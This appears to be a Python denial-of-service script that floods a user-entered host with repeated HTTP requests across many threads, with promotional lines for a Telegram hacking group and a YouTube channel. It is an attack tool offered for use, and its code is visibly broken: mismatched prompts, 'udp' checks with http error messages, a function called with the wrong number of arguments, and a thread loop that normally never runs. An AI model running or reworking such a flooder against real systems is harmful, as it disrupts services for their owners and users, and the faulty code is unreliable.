import os
import colorama
import threading
import requests
os.system("clear")
print ("Telegram - @Andreyoss")
print ("Chat - t.me/hak_team")
print ("Channel  YouTube - https://www.youtube.com/channel/UC6MUQYq5kg3URYSO5IL9E5g")
print ("")
print ("")
print ("")
print ("")
def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")
            threads = 9999999999999
 
ip = input("Enter The Target ip/Host: ")
port = input("Enter The Target ip/Host: ")
 
try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!")
 
if threads == 0:
    exit("Threads count is incorrect!")
 
if not ip.__contains__("udp"):
    exit("Ip doesnt contains http or https!")
 
if not ip.__contains__("."):
    exit("Invalid domain")
 
if not port.__contains__("udp"):
    exit("port doesnt contains http or https!")
 
if not port.__contains__("."):
    exit("Invalid domain")
 
for i in range(99999999999, threads):
    thr = threading.Thread(target=dos, args=(ip,port))
    thr.start()
    print(str(i + 1) + " thread started!")
